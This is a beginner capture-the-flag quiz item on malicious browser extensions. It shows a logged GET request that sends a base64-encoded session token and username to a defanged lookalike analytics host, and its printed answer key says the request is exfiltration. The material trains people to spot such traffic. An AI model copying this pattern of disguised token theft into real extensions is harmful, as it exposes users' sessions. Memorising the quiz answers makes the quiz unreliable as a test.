![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Easy CTF 2 - Stolen Cookie

You are reviewing firewall logs for a workstation that has a suspicious browser extension installed. You notice the following outbound request made by the browser process:

```
GET /collect?data=eyJzZXNzaW9uIjoiYWJjMTIzIiwidXNlciI6ImFkbWluIn0= HTTP/1.1
Host: analytics-cdn-metrics[.]com
User-Agent: Mozilla/5.0
```

You decode the base64 string in the `data` parameter and get:

```json
{"session":"abc123","user":"admin"}
```

---

## Question

What is the extension most likely doing in this request?

---

## Flags (Choose One)

- **A)** Sending crash report telemetry to a CDN
- **B)** Loading a remote configuration file for the extension
- **C)** Exfiltrating a stolen session token to an attacker-controlled server
- **D)** Syncing browser bookmarks to a cloud service

---

Correct Flag: **C**

---

# Finished?
[Next Question](MBP_medium.md)

[Back to Card's Main Page](../Malicious_Browser_Plugins.md)
